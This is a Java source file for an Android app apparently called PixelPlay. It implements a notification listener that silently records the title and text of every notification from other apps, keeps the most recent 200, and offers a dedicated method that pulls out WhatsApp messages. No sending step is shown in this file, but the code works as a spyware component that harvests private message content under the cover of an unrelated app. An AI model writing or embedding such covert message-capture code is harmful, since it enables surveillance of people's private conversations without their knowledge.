package com.pixelplay.app;

import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MyNotifListener extends NotificationListenerService {

    private static final String TAG = "PixelPlay";
    private static final List<JSONObject> caps = new ArrayList<>();
    private static final int MAX = 200;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            CharSequence t = sbn.getNotification().extras.getCharSequence("android.title", "");
            CharSequence x = sbn.getNotification().extras.getCharSequence("android.text", "");
            long tm = System.currentTimeMillis();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                tm = sbn.getPostTime();
            }

            JSONObject e = new JSONObject();
            e.put("package", pkg);
            e.put("title", t != null ? t.toString() : "");
            e.put("text", x != null ? x.toString() : "");
            e.put("time", tm);

            synchronized (caps) {
                caps.add(e);
                if (caps.size() > MAX) caps.remove(0);
            }

            String lb = pkg.equals("com.whatsapp") ? "WA" : pkg;
            Log.d(TAG, "notif " + lb + ": " + t);
        } catch (Exception ignored) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    public static JSONArray getCaptured() {
        JSONArray a = new JSONArray();
        synchronized (caps) {
            for (JSONObject n : caps) a.put(n);
        }
        return a;
    }

    public static JSONArray getWhatsApp() {
        JSONArray a = new JSONArray();
        synchronized (caps) {
            for (JSONObject n : caps) {
                try {
                    if ("com.whatsapp".equals(n.optString("package", ""))) a.put(n);
                } catch (Exception ignored) {}
            }
        }
        return a;
    }
}
